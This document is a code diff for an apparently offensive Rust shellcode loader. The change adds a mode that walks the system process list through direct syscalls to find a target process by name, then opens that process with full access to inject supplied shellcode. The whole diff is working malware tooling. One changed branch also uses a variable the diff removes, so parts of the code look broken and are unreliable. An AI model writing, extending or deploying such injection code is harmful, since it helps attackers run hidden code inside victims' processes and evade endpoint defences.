@@ -46,10 +46,79 @@ fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
 
 #[cfg(all(feature = "inject_proc_id", not(feature = "inject_self"), not(feature = "inject_proc_name")))]
 fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
-    use crate::winapi::constants::PROCESS_ALL_ACCESS;
+    let process_id = String::from(env!("PROCESS_ID")).parse().unwrap();
+    inner_load_with_id(ntdll, process_id, shell_code)
+}
+
+
+
+#[cfg(all(feature = "inject_proc_name", not(feature = "inject_proc_id"), not(feature = "inject_self")))]
+fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
+
 
     let ntdll = SyscallWrapper::new();
-    let process_id = String::from(env!("PROCESS_ID")).parse().unwrap();
+
+    let process_name = String::from(env!("PROCESS_NAME"));
+    let mut process_id = 0;
+
+    let mut return_length: u32 = 0;
+    let return_length_ptr: *mut u32 = &mut return_length;
+    let mut return_length_2: u32 = 0;
+    let return_length_2_ptr: *mut u32 = &mut return_length_2;
+
+    crate::debug_ok_msg!(format!("Call to NtQuerySystemInformation"));
+    let mut res = ntdll.nt_query_system_information(crate::winapi::constants::SYSTEM_PROCESS_INFORMATION, &mut 0, 0, return_length_ptr);
+    crate::debug_info_msg!(format!("Call to NtQuerySystemInformation : Result = {:#x}", res));
+    if res as u32 != 0xc0000004 {
+        return Err(Box::from("Failed to get size of process info list!"));
+    }
+    debug_success_msg!(format!("Size of process info list = {}", return_length));
+
+    let mut data = vec![0u8; return_length as usize];
+
+    crate::debug_ok_msg!(format!("Call to NtQuerySystemInformation"));
+    res = ntdll.nt_query_system_information(crate::winapi::constants::SYSTEM_PROCESS_INFORMATION, data.as_mut_ptr(), return_length , return_length_2_ptr);
+    crate::debug_info_msg!(format!("Call to NtQuerySystemInformation : Result = {:#x}", res));
+    if res != STATUS_SUCCESS {
+        return Err(Box::from("Failed to get process info list!"));
+    }
+    debug_success_msg!("Processes Info list retrieved.");
+
+    let processes_info_list_ptr = data.as_ptr() as *const crate::winapi::structs::SYSTEM_PROCESS_INFORMATION;
+    let mut current_ptr = processes_info_list_ptr;
+    unsafe {
+        loop {
+            let system_proc_info = *current_ptr;
+            //debug_info!(system_proc_info.NextEntryOffset);
+            
+            if system_proc_info.ImageName.Length != 0 {
+                //debug_info!(system_proc_info.ImageName.Buffer.to_string().unwrap());
+                if process_name.to_lowercase()  == system_proc_info.ImageName.Buffer.to_string().unwrap().to_lowercase() {
+                    process_id = system_proc_info.UniqueProcessId;
+                    break;
+                }
+            }
+
+
+            if system_proc_info.NextEntryOffset == 0 {
+                break;
+            }
+
+            current_ptr = (current_ptr as u64 + system_proc_info.NextEntryOffset as u64) as *const crate::winapi::structs::SYSTEM_PROCESS_INFORMATION;
+        }
+    }
+
+    if process_id == 0 {
+        return Err(Box::from(format!("Failed to find process whith name {}", process_name)));
+    }
+    debug_success_msg!(format!("Found process with id {}.", process_id));
+    
+    inner_load_with_id(&ntdll, process_id, shell_code)
+}
+
+fn inner_load_with_id(ntdll: &SyscallWrapper, process_id: isize, shell_code: Vec<u8>)  -> Result<(), Box<dyn Error>> {
+    use crate::winapi::constants::PROCESS_ALL_ACCESS;
+
     let mut process_handle: HANDLE = 0;
 
     crate::debug_ok_msg!(format!("Call to NtOpenProcess"));
